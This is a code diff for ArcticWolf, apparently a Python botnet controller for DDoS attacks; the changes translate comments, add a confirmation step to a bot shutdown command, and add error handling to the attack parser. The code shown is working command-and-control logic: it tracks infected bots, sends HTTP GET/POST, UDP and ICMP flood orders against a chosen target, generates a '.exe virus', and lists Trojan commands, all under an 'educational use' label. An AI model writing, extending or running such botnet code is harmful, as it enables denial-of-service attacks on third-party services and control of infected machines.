@@ -6,11 +6,11 @@ from os import path as os_path
 from shutil import rmtree, copy
 from random import randint
 from winsound import Beep
-datasock_list = {}  # 机器字典  {No:socket}
-last_Heartbeat = {}  # 记录机器的上次心跳时间
-ddos_attack_list = [] # 记录ddos的攻击列表
+datasock_list = {}  # dict of bots  {Number:socket}
+last_Heartbeat = {}  # recored the time a bot send its heartbeat message
+ddos_attack_list = [] # recored ddos attack launched
 mode_list = ['httpGETflood', 'httpPOSTflood', 'UDPflood', 'ICMPflood'] # 攻击方法
-# 带颜色打印
+# printed with color
 def print_error(str : str):
     print('\033[0;31m' + '[-] ' + str + '\033[0m')
 def print_good(str : str, add_symbol=True, line_break=False):
@@ -130,26 +130,30 @@ def post_cmd():
             rmtree("dist")
             print_good(f"{name}.exe virus generated successfully")
             
-        elif command == 'attack':
+        elif command == 'attack_mode':
             print_normal(f"Available attack method {mode_list}")
         elif command == 'shut':
-            send('shut')
+            if input(f'Are your sure to shutdown all the bots?, bots num : {len(datasock_list)} (y/n): >>> ') == 'y' or 'Y' or 'yes' or 'YES' or 'Yes':
+                send('shut')
         elif command.split('_')[0] == 'attack':
+            try:
             # ddos攻击
-            target = command.split('_')[2]
-            if target in ddos_attack_list:
-                print_normal(f'Already attacking {target}')
-            mode = command.split('_')[1]
-            if mode in mode_list:
-                ok = input(f'Are you sure to attack {target} using {mode}?(y,n) >>>')
-                if ok == 'y' or ok == 'Y' or ok == 'yes' or ok == 'YES' or ok == '':
-                    ddos_attack_list.append(target)
-                    History_write( f'Start to attack {target} with {mode}', 'A')
-                    send(command)
+                target = command.split('_')[2]
+                if target in ddos_attack_list:
+                    print_normal(f'Already attacking {target}')
+                mode = command.split('_')[1]
+                if mode in mode_list:
+                    ok = input(f'Are you sure to attack {target} using {mode}?(y,n) >>>')
+                    if ok == 'y' or ok == 'Y' or ok == 'yes' or ok == 'YES' or ok == '':
+                        ddos_attack_list.append(target)
+                        History_write( f'Start to attack {target} with {mode}', 'A')
+                        send(command)
+                    else:
+                        print_normal('All attack canceled')
                 else:
-                    print_normal('All attack canceled')
-            else:
-                print_error(f'Unknown attack method {mode}, print out the mode list {mode_list}')
+                    print_error(f'Unknown attack method {mode}, print out the mode list {mode_list}')
+            except:
+                print_error(f'Unknown attack command : {command}, attack format : attack_[attack_mode]_[target]')
         elif command == 'stop_ddos':
             # 停止攻击
             ddos_attack_list.clear()
@@ -174,7 +178,8 @@ def post_cmd():
                 
     --------Attack command--------
                 
-    attack_httpflood_http://....Launch : http flood(GET request) attack 
+    attack_[attack_mode]_[target] : attack the target(url or ip) with attack_mode
+    attack_mode : print out the available attack mode 
     stop_ddos : Stop all attack command
 
     --------Trojan command--------
@@ -185,6 +190,7 @@ def post_cmd():
     --------Other command---------
                         
     exit : exit ArcticWolf
+    shut : shutdown all the bots
     help : print out help
     clear_history : clear history file 
     reload : Reload settings in settings.json   
@@ -359,7 +365,7 @@ if __name__ == '__main__':
 
 [ArcticWolf] : A botnet controller for Ddos attacks using frp (without server)
 ---------------------------------------------------------------------------
-[Version] : v0.1.4     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  
+[Version] : v0.1.4.2     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  
 
 ===========================================================================
 
